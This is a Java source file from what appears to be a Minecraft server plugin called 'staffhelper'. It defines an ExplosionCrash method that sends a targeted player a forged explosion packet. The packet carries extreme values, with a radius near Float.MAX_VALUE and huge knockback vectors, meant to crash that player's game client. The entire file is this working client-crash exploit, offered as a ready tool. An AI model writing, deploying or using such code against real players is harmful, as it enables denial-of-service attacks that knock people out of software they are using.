package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import dev.xnlawa.staffhelper.util.RandomUtil;
import org.bukkit.entity.Player;

import java.util.Collections;

public class ExplosionCrash extends Crash {
    public ExplosionCrash() {
        super(CrashMethod.EXPLOSION);
    }

    @Override
    public void performCrash(Player player) {
        float bigFloat = Float.MAX_VALUE * RandomUtil.nextFloat(0.5f,0.75f);
        Vector3d position = new Vector3d(player.getLocation().getX() + RandomUtil.nextInt(300,600), player.getLocation().getY(), player.getLocation().getZ() + RandomUtil.nextInt(300,600));
        WrapperPlayServerExplosion explosion = new WrapperPlayServerExplosion(position, RandomUtil.nextFloat(666666666f,Float.MAX_VALUE), Collections.emptyList(), new Vector3f(bigFloat,bigFloat,bigFloat));
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, explosion);
    }
}
